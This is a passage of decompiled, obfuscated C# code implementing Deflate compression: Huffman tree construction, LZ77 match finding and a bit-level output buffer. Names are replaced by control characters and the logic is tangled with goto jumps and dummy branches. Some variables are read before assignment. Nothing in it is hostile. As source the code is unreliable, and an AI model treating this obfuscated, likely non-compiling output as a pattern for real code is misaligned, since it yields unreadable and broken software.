          this.\u0001 = new short[elems];
          this.\u0001 = new int[maxLength];
        }

        public void \u0001(int code) => this.\u0001.\u0001.\u0001((int) this.\u0002[code] & (int) ushort.MaxValue, (int) this.\u0001[code]);

        public void \u0001(short[] stCodes, byte[] stLength)
        {
          this.\u0002 = stCodes;
          this.\u0001 = stLength;
        }

        public void \u0001()
        {
          int length = this.\u0001.Length;
label_18:
          int[] numArray = new int[this.\u0003];
          int num1;
          if (true)
            num1 = 0;
          this.\u0002 = new short[this.\u0001.Length];
          int index1 = 0;
          while (true)
          {
            int num2 = index1;
            if (false)
              goto label_14;
            else
              goto label_4;
label_1:
            int num3;
            int num4;
            num1 = num3 + num4;
            int num5 = index1;
            if (true)
            {
              index1 = num5 + 1;
              continue;
            }
            goto label_7;
label_4:
            int num6 = this.\u0003;
            if (num2 >= num6)
            {
              if (true)
                num5 = 0;
              else
                goto label_15;
            }
            else
            {
              numArray[index1] = num1;
              int num7 = num1;
              num4 = this.\u0001[index1] << 15 - index1;
              num3 = num7;
              goto label_1;
            }
label_7:
            int index2 = num5;
            goto label_15;
label_14:
            index2 = num2;
label_15:
            num3 = index2;
            num4 = this.\u0002;
            if (true)
              goto label_16;
label_13:
            num2 = num3 + num4;
            goto label_14;
label_16:
            if (true)
            {
              if (num3 < num4)
              {
                int num8 = (int) this.\u0001[index2];
                if (true)
                {
                  if (num8 > 0)
                  {
                    this.\u0002[index2] = \u0001.\u0007.\u0001(numArray[num8 - 1]);
                    numArray[num8 - 1] += 1 << 16 - num8;
                  }
                  int num9 = index2;
                  num4 = 1;
                  num3 = num9;
                  goto label_13;
                }
                else
                  goto label_18;
              }
              else
                break;
            }
            else
              goto label_1;
          }
        }

        private void \u0001(int[] childs)
        {
          this.\u0001 = new byte[this.\u0001.Length];
          int length = childs.Length / 2;
          int num1 = (length + 1) / 2;
          if (true)
            goto label_33;
label_1:
          for (int index = 0; index < this.\u0003; ++index)
          {
            if (true)
              this.\u0001[index] = 0;
            else
              goto label_11;
          }
          int[] numArray1 = new int[length];
          numArray1[length - 1] = 0;
          int index1 = length - 1;
          goto label_13;
label_11:
          this.\u0001[childs[2 * index1]] = (byte) numArray1[index1];
label_12:
          --index1;
label_13:
          int num2 = index1;
          int num3;
          int num4;
          int num5;
          while (true)
          {
            if (num2 < 0)
            {
              if (num3 != 0)
              {
                if (true)
                {
                  int index2 = this.\u0003 - 1;
                  int num6;
                  do
                  {
                    do
                      ;
                    while (this.\u0001[--index2] == 0);
                    do
                    {
                      --this.\u0001[index2];
                      int[] numArray2;
                      int[] numArray3 = numArray2 = this.\u0001;
                      int index3;
                      index2 = index3 = index2 + 1;
                      int index4 = index3;
                      int num7 = numArray3[(IntPtr) index4] + 1;
                      numArray2[index3] = num7;
                      num4 = num3;
                      num5 = 1;
                      if (num5 != 0)
                      {
                        int num8 = num5 << this.\u0003 - 1 - index2;
                        num6 = num4 - num8;
                        if (true)
                          num3 = num6;
                        else
                          goto label_35;
                      }
                      else
                        goto label_25;
                    }
                    while (num3 > 0 && index2 < this.\u0003 - 1);
                  }
                  while (num3 > 0);
                  goto label_24;
label_35:
                  num2 = num6;
                }
                else
                  goto label_13;
              }
              else
                goto label_5;
            }
            else
              break;
          }
          int num9;
          if (childs[2 * index1 + 1] != -1)
          {
            num9 = numArray1[index1] + 1;
            if (num9 > this.\u0003)
            {
              num9 = this.\u0003;
              ++num3;
            }
          }
          else
          {
            ++this.\u0001[numArray1[index1] - 1];
            goto label_11;
          }
label_9:
          numArray1[childs[2 * index1]] = numArray1[childs[2 * index1 + 1]] = num9;
          goto label_12;
label_5:
          return;
label_24:
          this.\u0001[this.\u0003 - 1] += num3;
          this.\u0001[this.\u0003 - 2] -= num3;
          num5 = num1;
          num4 = 2;
label_25:
          int num10 = num4 * num5;
          for (int index5 = this.\u0003; index5 != 0; --index5)
          {
            if (true)
            {
              int num11 = this.\u0001[index5 - 1];
              while (num11 > 0)
              {
                int index6 = 2 * childs[num10++];
                if (childs[index6 + 1] == -1)
                {
                  this.\u0001[childs[index6]] = (byte) index5;
                  --num11;
                }
              }
            }
            else
              goto label_9;
          }
          return;
label_33:
          num3 = 0;
          goto label_1;
        }

        public void \u0002()
        {
          int length = this.\u0001.Length;
          int[] numArray1 = new int[length];
          int num1 = 0;
label_1:
          int num2 = 0;
label_9:
          for (int index1 = 0; index1 < length; ++index1)
          {
            int num3 = (int) this.\u0001[index1];
            if (num3 != 0)
            {
              int index2 = num1++;
              while (true)
              {
                int index3;
                if (index2 > 0 && (int) this.\u0001[numArray1[index3 = (index2 - 1) / 2]] > num3)
                {
                  if (true)
                  {
                    numArray1[index2] = numArray1[index3];
                    index2 = index3;
                  }
                  else
                    goto label_32;
                }
                else
                {
                  numArray1[index2] = index1;
                  num2 = index1;
                  goto label_9;
                }
              }
              goto label_33;
            }
          }
          int num4;
          for (; num1 < 2; numArray1[num1++] = num4)
          {
            int num5;
            if (num2 >= 2)
              num5 = 0;
            else
              num2 = num5 = num2 + 1;
            num4 = num5;
          }
          this.\u0002 = Math.Max(num2 + 1, this.\u0001);
          int num6 = num1;
          int num7 = 4 * num1;
          int num8 = 2;
          int num9 = num7;
label_16:
          int[] childs = new int[num9 - num8];
          int[] numArray2 = new int[2 * num1 - 1];
          int num10 = num6;
          for (int index4 = 0; index4 < num1; ++index4)
          {
            int index5 = numArray1[index4];
            childs[2 * index4] = index5;
            childs[2 * index4 + 1] = -1;
            numArray2[index4] = (int) this.\u0001[index5] << 8;
            numArray1[index4] = index4;
          }
label_19:
          int index6 = numArray1[0];
          int index7 = numArray1[--num1];
          int index8 = 0;
          int index9;
          int num11;
          int num12;
          for (index9 = 1; index9 < num1; index9 = index9 * 2 + 1)
          {
            if (index9 + 1 < num1)
            {
              num11 = numArray2[numArray1[index9]];
              num12 = numArray2[numArray1[index9 + 1]];
              if (true)
              {
                if (num11 > num12)
                  ++index9;
              }
              else
                goto label_37;
            }
            numArray1[index8] = numArray1[index9];
            index8 = index9;
          }
          int num13 = numArray2[index7];
label_29:
          int index10;
          while ((index10 = index8) > 0 && numArray2[numArray1[index8 = (index10 - 1) / 2]] > num13)
          {
            if (true)
              numArray1[index10] = numArray1[index8];
            else
              goto label_19;
          }
          numArray1[index10] = index7;
          int index11 = numArray1[0];
          index7 = num10++;
          if (true)
            childs[2 * index7] = index6;
          else
            goto label_1;
label_32:
          childs[2 * index7 + 1] = index11;
label_33:
          int val1 = numArray2[index6] & (int) byte.MaxValue;
          if (true)
          {
            int val2 = numArray2[index11] & (int) byte.MaxValue;
            int num14 = Math.Min(val1, val2);
            if (true)
            {
              numArray2[index7] = num13 = numArray2[index6] + numArray2[index11] - num14 + 1;
              index8 = 0;
              index9 = 1;
              goto label_41;
            }
            else
              goto label_29;
          }
          else
            goto label_45;
label_37:
          if (num11 + num12 < num1 && numArray2[numArray1[index9]] > numArray2[numArray1[index9 + 1]])
            ++index9;
          numArray1[index8] = numArray1[index9];
          index8 = index9;
          num9 = index8 * 2;
          num8 = 1;
          if (num8 != 0)
            index9 = num9 + num8;
          else
            goto label_16;
label_41:
          if (index9 < num1)
          {
            int num15 = index9;
            num12 = 1;
            num11 = num15;
            goto label_37;
          }
label_43:
          if ((index10 = index8) > 0)
            val1 = numArray2[numArray1[index8 = (index10 - 1) / 2]];
          else
            goto label_46;
label_45:
          int num16 = num13;
          if (val1 > num16)
          {
            numArray1[index10] = numArray1[index8];
            goto label_43;
          }
label_46:
          numArray1[index10] = index7;
          if (num1 <= 1)
            this.\u0001(childs);
          else
            goto label_19;
        }

        public int \u0001()
        {
          int num1 = 0;
          int num2 = 0;
          while (true)
          {
            int index = num2;
            int num3;
            while (true)
            {
              int num4 = index;
              int num5 = this.\u0001.Length;
              int num6;
              while (true)
              {
                int num7 = num5;
                if (false)
                  num5 = num7;
                else if (num4 >= num7)
                {
                  int num8 = num1;
                  if (false)
                  {
                    num6 = num8;
                    goto label_7;
                  }
                  else
                  {
                    if (true)
                      return num8;
                    num3 = num8;
                    goto label_5;
                  }
                }
                else
                {
                  int num9 = num1;
                  num5 = (int) this.\u0001[index] * (int) this.\u0001[index];
                  num4 = num9;
                  break;
                }
              }
              num3 = num4 + num5;
label_5:
              if (true)
              {
                num1 = num3;
                num6 = index;
              }
              else
                break;
label_7:
              index = num6 + 1;
            }
            num2 = num3;
          }
        }

        public void \u0001(\u0001.\u0007.\u0001 blTree)
        {
label_0:
          int num1 = -1;
          int index1;
          if (true)
          {
            index1 = 0;
            goto label_28;
          }
          else
            goto label_11;
label_8:
          int num2;
          if (true)
            num2 = 0;
          else
            goto label_0;
label_10:
          int num3;
          num1 = num3;
label_11:
          ++index1;
          goto label_16;
label_13:
          int num4;
          index1 = num4;
          int num5;
          int num6;
          if (true)
          {
            num2 = num6 = num2 + 1;
            if (true)
            {
              if (num6 >= num5)
                goto label_20;
            }
            else
              goto label_19;
          }
          else
            goto label_8;
label_16:
          int num7 = index1;
          if (true)
          {
            int num8 = this.\u0002;
            if (num7 < num8)
              num6 = num1;
            else
              goto label_20;
          }
          else
            goto label_25;
label_19:
          if (num6 == (int) this.\u0001[index1])
          {
            num4 = index1 + 1;
            goto label_13;
          }
label_20:
          int num9;
          if (num2 < num9)
          {
            short[] numArray;
            IntPtr index2;
            (numArray = blTree.\u0001)[(int) (index2 = (IntPtr) num1)] = (short) ((int) numArray[index2] + (int) (short) num2);
            goto label_28;
          }
          else if (num1 != 0)
          {
            short[] numArray;
            (numArray = blTree.\u0001)[16] = (short) ((int) numArray[16] + 1);
            goto label_28;
          }
          else
            num7 = num2;
label_25:
          if (num7 <= 10)
          {
            short[] numArray;
            (numArray = blTree.\u0001)[17] = (short) ((int) numArray[17] + 1);
            goto label_28;
          }
label_27:
          short[] numArray1;
          (numArray1 = blTree.\u0001)[18] = (short) ((int) numArray1[18] + 1);
label_28:
          if (index1 >= this.\u0002)
            return;
          num2 = 1;
          num3 = (int) this.\u0001[index1];
          if (num3 == 0)
          {
            num5 = 138;
            num4 = 3;
            if (num4 != 0)
            {
              num9 = num4;
              goto label_10;
            }
            else
              goto label_13;
          }
          else
          {
            num5 = 6;
            num9 = 3;
            if (true)
            {
              if (num1 != num3)
              {
                short[] numArray2;
                IntPtr index3;
                (numArray2 = blTree.\u0001)[(int) (index3 = (IntPtr) num3)] = (short) ((int) numArray2[index3] + 1);
                goto label_8;
              }
              else
                goto label_10;
            }
            else
              goto label_27;
          }
        }

        public void \u0002(\u0001.\u0007.\u0001 blTree)
        {
          int code1 = -1;
          int index = 0;
label_24:
          int num1;
          while (true)
          {
            if (false)
              goto label_7;
            else
              goto label_25;
label_2:
            int num2;
            int num3;
            int code2;
            if (true)
            {
              if (code2 == 0)
              {
                num2 = 138;
                num3 = 3;
                goto label_9;
              }
              else
              {
                num2 = 6;
                num3 = 3;
                if (code1 == code2)
                  goto label_9;
              }
            }
            else
              break;
label_5:
            if (true)
              blTree.\u0001(code2);
            else
              goto label_2;
label_7:
            if (true)
              num1 = 0;
            else
              goto label_12;
label_9:
            code1 = code2;
            if (true)
              ++index;
            else
              goto label_5;
label_12:
            while (index < this.\u0002 && code1 == (int) this.\u0001[index])
            {
              ++index;
              if (++num1 >= num2)
                break;
            }
            if (num1 >= num3)
            {
              if (code1 == 0)
                goto label_19;
label_18:
              blTree.\u0001(16);
              this.\u0001.\u0001.\u0001(num1 - 3, 2);
              continue;
label_19:
              if (num1 <= 10)
              {
                blTree.\u0001(17);
                this.\u0001.\u0001.\u0001(num1 - 3, 3);
                continue;
              }
              blTree.\u0001(18);
              if (true)
              {
                if (true)
                {
                  this.\u0001.\u0001.\u0001(num1 - 11, 7);
                  continue;
                }
                goto label_9;
              }
              else
                goto label_18;
            }
            else
              goto label_15;
label_25:
            if (index < this.\u0002)
            {
              num1 = 1;
              code2 = (int) this.\u0001[index];
              goto label_2;
            }
            else
              goto label_16;
          }
label_14:
          blTree.\u0001(code1);
label_15:
          if (num1-- > 0)
            goto label_14;
          else
            goto label_24;
label_16:;
        }
      }
    }

    internal sealed class \u0008
    {
      private const int \u0001 = 258;
      private const int \u0002 = 3;
      private const int \u0003 = 32768;
      private const int \u0004 = 32767;
      private const int \u0005 = 32768;
      private const int \u0006 = 32767;
      private const int \u0007 = 5;
      private const int \u0008 = 262;
      private const int \u000E = 32506;
      private const int \u000F = 4096;
      private int \u0010;
      private short[] \u0001;
      private short[] \u0002;
      private int \u0011;
      private int \u0012;
      private bool \u0001;
      private int \u0013;
      private int \u0014;
      private int \u0015;
      private byte[] \u0001;
      private byte[] \u0002;
      private int \u0016;
      private int \u0017;
      private int \u0018;
      private \u0001.\u000E \u0001;
      private \u0001.\u0007 \u0001;

      public \u0008(\u0001.\u000E pending)
      {
        this.\u0001 = pending;
        this.\u0001 = new \u0001.\u0007(pending);
        this.\u0001 = new byte[65536];
        this.\u0001 = new short[32768];
        this.\u0002 = new short[32768];
        this.\u0013 = this.\u0014 = 1;
      }

      private void \u0001() => this.\u0010 = (int) this.\u0001[this.\u0014] << 5 ^ (int) this.\u0001[this.\u0014 + 1];

      private int \u0001()
      {
        int index;
        short num1;
        int num2;
        int maxValue;
        do
        {
          num2 = this.\u0010 << 5;
          maxValue = (int) this.\u0001[this.\u0014 + 2];
          if (true)
          {
            index = (num2 ^ maxValue) & (int) short.MaxValue;
            this.\u0002[this.\u0014 & (int) short.MaxValue] = num1 = this.\u0001[index];
          }
          else
            goto label_3;
        }
        while (false);
        this.\u0001[index] = (short) this.\u0014;
        this.\u0010 = index;
        int num3 = (int) num1;
        maxValue = (int) ushort.MaxValue;
        num2 = num3;
label_3:
        return num2 & maxValue;
      }

      private void \u0002()
      {
        if (false)
          goto label_17;
        else
          goto label_15;
label_2:
        int num1;
        int num2;
        int num3 = num1 & num2;
        goto label_17;
label_4:
        int index1;
        int num4;
        int num5;
        if (num5 != 0)
          index1 = num4 + num5;
        else
          goto label_13;
label_6:
        int num6 = index1;
        int num7;
        while (true)
        {
          if (num6 < 32768)
          {
            num7 = (int) this.\u0001[index1];
            if (false)
              num6 = num7;
            else
              break;
          }
          else
            goto label_8;
        }
        num2 = (int) ushort.MaxValue;
        num1 = num7;
        goto label_2;
label_8:
        int index2 = 0;
label_12:
        int num8 = index2;
        num5 = 32768;
        num4 = num8;
label_13:
        if (num4 >= num5)
          return;
        int num9 = (int) this.\u0002[index2];
        int maxValue = (int) ushort.MaxValue;
        if (maxValue == 0)
        {
          num5 = maxValue;
          num4 = num9;
          goto label_4;
        }
        else
        {
          int num10 = num9 & maxValue;
          this.\u0002[index2] = num10 >= 32768 ? (short) (num10 - 32768) : (short) 0;
          num1 = index2;
          num2 = 1;
          if (num2 != 0)
          {
            index2 = num1 + num2;
            goto label_12;
          }
          else
            goto label_2;
        }
label_15:
        Array.Copy((Array) this.\u0001, 32768, (Array) this.\u0001, 0, 32768);
        this.\u0011 -= 32768;
        this.\u0014 -= 32768;
        this.\u0013 -= 32768;
        index1 = 0;
        goto label_6;
label_17:
        this.\u0001[index1] = num3 >= 32768 ? (short) (num3 - 32768) : (short) 0;
        num4 = index1;
        num5 = 1;
        goto label_4;
      }

      public void \u0003()
      {
label_0:
        int num1 = this.\u0014;
        int num2 = 65274;
        if (num2 != 0)
        {
          if (num1 >= num2)
          {
            this.\u0002();
            goto label_11;
          }
          else
            goto label_11;
        }
        else
          goto label_14;
label_10:
        int length;
        this.\u0016 += length;
        this.\u0015 += length;
label_11:
        if (this.\u0015 >= 262)
          goto label_15;
label_12:
        int num3 = this.\u0017;
        if (true)
        {
          num2 = this.\u0018;
          num1 = num3;
        }
        else
          goto label_19;
label_14:
        if (num1 < num2)
        {
          if (true)
          {
            num3 = 65536 - this.\u0015 - this.\u0014;
            goto label_19;
          }
          else
            goto label_10;
        }
label_15:
        if (true)
        {
          if (this.\u0015 < 3)
            return;
          this.\u0001();
          return;
        }
        goto label_12;
label_19:
        length = num3;
        if (length > this.\u0018 - this.\u0017)
        {
          int num4 = this.\u0018;
          int num5 = this.\u0017;
          if (true)
          {
            length = num4 - num5;
          }
          else
          {
            num2 = num5;
            num1 = num4;
            goto label_14;
          }
        }
        Array.Copy((Array) this.\u0002, this.\u0017, (Array) this.\u0001, this.\u0014 + this.\u0015, length);
        if (true)
        {
          this.\u0017 += length;
          goto label_10;
        }
        else
          goto label_0;
      }

      private bool \u0001(int curMatch)
      {
        int num1 = 128;
        int val1;
        int num2;
        int num3;
        int index1;
        byte num4;
        byte num5;
        int num6;
        int index2;
        short[] numArray;
        int num7;
        int num8;
        int num9;
        if (true)
        {
          num6 = 128;
          numArray = this.\u0002;
          index2 = this.\u0014;
          index1 = this.\u0014 + this.\u0012;
          val1 = Math.Max(this.\u0012, 2);
          num2 = Math.Max(this.\u0014 - 32506, 0);
          num3 = this.\u0014 + 258 - 1;
          num4 = this.\u0001[index1 - 1];
          num5 = this.\u0001[index1];
          int num10 = val1;
          if (true)
          {
            if (num10 >= 8)
              num1 >>= 2;
            int num11 = num6;
            num8 = this.\u0015;
            num7 = num11;
          }
          else
          {
            num9 = num10;
            goto label_9;
          }
        }
        else
          goto label_19;
label_5:
        if (num7 > num8)
          num6 = this.\u0015;
label_7:
        if ((int) this.\u0001[curMatch + val1] != (int) num5 || (int) this.\u0001[curMatch + val1 - 1] != (int) num4 || (int) this.\u0001[curMatch] != (int) this.\u0001[index2] || (int) this.\u0001[curMatch + 1] != (int) this.\u0001[index2 + 1])
          goto label_22;
label_8:
        num9 = curMatch + 2;
label_9:
        int num12 = num9;
        index2 += 2;
label_10:
        if (true)
        {
          if ((int) this.\u0001[++index2] == (int) this.\u0001[++num12] && (int) this.\u0001[++index2] == (int) this.\u0001[++num12])
          {
            int num13 = (int) this.\u0001[++index2];
            int num14;
            for (int index3 = (int) this.\u0001[++num12]; num13 == index3 && (int) this.\u0001[++index2] == (int) this.\u0001[++num12] && (int) this.\u0001[++index2] == (int) this.\u0001[++num12] && (int) this.\u0001[++index2] == (int) this.\u0001[++num12]; num13 = num14)
            {
              num14 = (int) this.\u0001[++index2];
              int num15 = (int) this.\u0001[++num12];
              if (false)
              {
                index3 = num15;
              }
              else
              {
                if (num14 != num15 || (int) this.\u0001[++index2] != (int) this.\u0001[++num12])
                  break;
                goto label_16;
              }
            }
            goto label_17;
          }
          else
            goto label_17;
        }
        else
          goto label_8;
label_16:
        if (index2 < num3)
          goto label_10;
label_17:
        if (index2 > index1)
          this.\u0011 = curMatch;
        else
          goto label_21;
label_19:
        index1 = index2;
        val1 = index2 - this.\u0014;
        if (val1 >= num6)
          goto label_26;
label_20:
        num4 = this.\u0001[index1 - 1];
        num5 = this.\u0001[index1];
label_21:
        index2 = this.\u0014;
label_22:
        curMatch = num7 = (int) numArray[curMatch & (int) short.MaxValue] & (int) ushort.MaxValue;
        num8 = num2;
        if (true)
        {
          if (num7 > num8)
          {
            if (true)
            {
              if (--num1 != 0)
                goto label_7;
            }
            else
              goto label_16;
          }
        }
        else
          goto label_5;
label_26:
        while (true)
        {
          this.\u0012 = Math.Min(val1, this.\u0015);
          if (true)
            return this.\u0012 >= 3;
        }
        goto label_20;
      }

      private bool \u0001(bool flush, bool finish)
      {
        if (this.\u0015 < 262 && !flush)
          return false;
label_39:
        int num1 = this.\u0015;
        int num2 = 262;
        if (num2 == 0)
          goto label_22;
        else
          goto label_40;
label_3:
        int num3 = 65274;
        int num4;
        int len;
        int curMatch;
        int num5;
        int num6;
        if (num3 != 0)
        {
          if (num6 >= num3)
            this.\u0002();
          num4 = this.\u0011;
          len = this.\u0012;
          if (this.\u0015 >= 3)
          {
            curMatch = this.\u0001();
            if (curMatch != 0)
              num5 = this.\u0014;
            else
              goto label_14;
          }
          else
            goto label_14;
        }
        else
          goto label_34;
label_9:
        int num7 = curMatch;
        int num8;
        if (num5 - num7 <= 32506 && this.\u0001(curMatch) && this.\u0012 <= 5)
          num8 = this.\u0012;
        else
          goto label_14;
label_11:
        if (num8 == 3 && this.\u0014 - this.\u0011 > 4096)
        {
          if (true)
            this.\u0012 = 2;
          else
            goto label_27;
        }
label_14:
        int num9 = len;
        int num10 = 3;
        int num11;
        int num12;
        if (num10 != 0)
        {
          if (num9 >= num10 && this.\u0012 <= len)
          {
            this.\u0001.\u0001(this.\u0014 - 1 - num4, len);
            len -= 2;
          }
          else
          {
            if (this.\u0001)
              this.\u0001.\u0001((int) this.\u0001[this.\u0014 - 1] & (int) byte.MaxValue);
            this.\u0001 = true;
            ++this.\u0014;
            --this.\u0015;
            goto label_27;
          }
        }
        else
        {
          num12 = num10;
          num11 = num9;
          goto label_20;
        }
label_17:
        ++this.\u0014;
        --this.\u0015;
        if (this.\u0015 >= 3)
          this.\u0001();
        num11 = len;
        num12 = 1;
label_20:
        len = num8 = num11 - num12;
        if (true)
        {
          num2 = 0;
          num1 = num8;
        }
        else
          goto label_11;
label_22:
        if (num1 <= num2)
        {
          ++this.\u0014;
          --this.\u0015;
          this.\u0001 = false;
          this.\u0012 = 2;
        }
        else
          goto label_17;
label_27:
        int storedLength;
        if (this.\u0001.\u0001())
        {
          num5 = this.\u0014 - this.\u0013;
          if (true)
          {
            storedLength = num5;
            num6 = this.\u0001 ? 1 : 0;
            if (true)
            {
              if (num6 != 0)
                --storedLength;
              if (finish && this.\u0015 == 0)
              {
                int num13 = this.\u0001 ? 1 : 0;
                num3 = 0;
                num6 = num13;
              }
              else
              {
                num5 = 0;
                goto label_37;
              }
            }
            else
              goto label_3;
          }
          else
            goto label_37;
        }
        else
          goto label_39;
label_34:
        num5 = num6 == num3 ? 1 : 0;
label_37:
        if (true)
        {
          bool lastBlock = num5 != 0;
          this.\u0001.\u0002(this.\u0001, this.\u0013, storedLength, lastBlock);
          this.\u0013 += storedLength;
          return !lastBlock;
        }
        goto label_9;
label_40:
        if (num1 < num2 && !flush)
          return true;
        if (this.\u0015 != 0)
        {
          num6 = this.\u0014;
          goto label_3;
        }
        else
        {
          if (this.\u0001)
            this.\u0001.\u0001((int) this.\u0001[this.\u0014 - 1] & (int) byte.MaxValue);
          this.\u0001 = false;
          this.\u0001.\u0002(this.\u0001, this.\u0013, this.\u0014 - this.\u0013, finish);
          this.\u0013 = this.\u0014;
          return false;
        }
      }

      public bool \u0002(bool flush, bool finish)
      {
        bool flag;
        do
        {
          this.\u0003();
          int num = flush ? 1 : 0;
          if (true)
          {
            if (num == 0)
            {
              if (true)
                num = 0;
              else
                continue;
            }
            else
              goto label_9;
          }
label_4:
          if (true)
            goto label_10;
label_6:
          flag = num != 0;
label_7:
          continue;
label_10:
          bool flush1 = num != 0;
          if (true)
          {
            if (true)
            {
              num = this.\u0001(flush1, finish) ? 1 : 0;
              goto label_6;
            }
          }
          else
            goto label_7;
label_9:
          num = this.\u0017 == this.\u0018 ? 1 : 0;
          goto label_4;
        }
        while (this.\u0001.IsFlushed && flag);
        return flag;
      }

      public void \u0001(byte[] buffer)
      {
        if (true)
          this.\u0002 = buffer;
        do
        {
          this.\u0017 = 0;
          this.\u0018 = buffer.Length;
        }
        while (false);
      }

      public bool \u0001() => this.\u0018 == this.\u0017;
    }

    internal sealed class \u000E
    {
      protected byte[] \u0001 = new byte[65536];
      private int \u0001 = 0;
      private int \u0002 = 0;
      private uint \u0001 = 0;
      private int \u0003 = 0;

      public void \u0001(int s)
      {
        byte[] numArray1 = this.\u0001;
        \u0001.\u000E obj1 = this;
        int num1;
        int num2 = num1 = obj1.\u0002;
        obj1.\u0002 = num1 + 1;
        int index1 = num2;
        int num3 = (int) (byte) s;
        numArray1[index1] = (byte) num3;
        byte[] numArray2 = this.\u0001;
        \u0001.\u000E obj2 = this;
        int num4;
        int num5 = num4 = obj2.\u0002;
        obj2.\u0002 = num4 + 1;
        int index2 = num5;
        int num6 = (int) (byte) (s >> 8);
        numArray2[index2] = (byte) num6;
      }

      public void \u0001(byte[] block, int offset, int len)
      {
label_0:
        Array.Copy((Array) block, offset, (Array) this.\u0001, this.\u0002, len);
        do
        {
          if (true)
            this.\u0002 += len;
          else
            goto label_0;
        }
        while (false);
      }

      public int BitCount => this.\u0003;

      public void \u0001()
      {
        if (this.\u0003 > 0)
          goto label_2;
label_1:
        this.\u0001 = 0U;
        this.\u0003 = 0;
        return;
label_2:
        byte[] numArray1 = this.\u0001;
        \u0001.\u000E obj1 = this;
        int num1;
        int num2 = num1 = obj1.\u0002;
        obj1.\u0002 = num1 + 1;
        int index1 = num2;
        int num3 = (int) (byte) this.\u0001;
        numArray1[index1] = (byte) num3;
        if (this.\u0003 > 8)
        {
          byte[] numArray2 = this.\u0001;
          \u0001.\u000E obj2 = this;
          int num4;
          int num5 = num4 = obj2.\u0002;
          obj2.\u0002 = num4 + 1;
          int index2 = num5;
          int num6 = (int) (byte) (this.\u0001 >> 8);
          numArray2[index2] = (byte) num6;
          goto label_1;
        }
        else
          goto label_1;
      }

      public void \u0001(int b, int count)
      {
        do
        {
          this.\u0001 |= (uint) (b << this.\u0003);
          this.\u0003 += count;
          if (this.\u0003 >= 16)
            goto label_5;
label_4:
          continue;
label_5:
          byte[] numArray = this.\u0001;
          \u0001.\u000E obj = this;
          int num1;
          int num2 = num1 = obj.\u0002;
          obj.\u0002 = num1 + 1;
          int index = num2;
          int num3 = (int) (byte) this.\u0001;
          numArray[index] = (byte) num3;
label_1:
          if (true)
          {
            this.\u0001[this.\u0002++] = (byte) (this.\u0001 >> 8);
            this.\u0001 >>= 16;
            if (true)
            {
              this.\u0003 -= 16;
              goto label_4;
            }
            else
              goto label_1;
          }
        }
        while (false);
      }

      public bool IsFlushed => this.\u0002 == 0;

      public int \u0001(byte[] output, int offset, int length)
      {
        int num1 = this.\u0003;
        int num2 = 8;
        int num3;
        int num4;
        while (true)
        {
          if (num1 >= num2)
          {
            byte[] numArray = this.\u0001;
            \u0001.\u000E obj = this;
            int num5;
            int num6 = num5 = obj.\u0002;
            obj.\u0002 = num5 + 1;
            int index = num6;
            int num7 = (int) (byte) this.\u0001;
            numArray[index] = (byte) num7;
            if (true)
            {
              this.\u0001 >>= 8;
              this.\u0003 -= 8;
            }
            else
              goto label_6;
          }
          if (length > this.\u0002 - this.\u0001)
          {
            num3 = this.\u0002;
            num4 = this.\u0001;
            if (false)
            {
              num2 = num4;
              num1 = num3;
            }
            else
              break;
          }
          else
            goto label_5;
        }
        length = num3 - num4;
        Array.Copy((Array) this.\u0001, this.\u0001, (Array) output, offset, length);
        this.\u0001 = 0;
        this.\u0002 = 0;
        goto label_6;
label_5:
        Array.Copy((Array) this.\u0001, this.\u0001, (Array) output, offset, length);
        this.\u0001 += length;
label_6:
        return length;
      }
    }

    internal sealed class \u000F : MemoryStream
    {
      public void \u0001(int value)
      {
        this.WriteByte((byte) (value & (int) byte.MaxValue));
        this.WriteByte((byte) (value >> 8 & (int) byte.MaxValue));
      }

      public void \u0002(int value)
      {
        this.\u0001(value);
        this.\u0001(value >> 16);
      }

      public int \u0001() => this.ReadByte() | this.ReadByte() << 8;

      public int \u0002() => this.\u0001() | this.\u0001() << 16;

      public \u000F()
      {
      }

      public \u000F(byte[] buffer)
        : base(buffer, false)
      {
      }
    }
  }
}
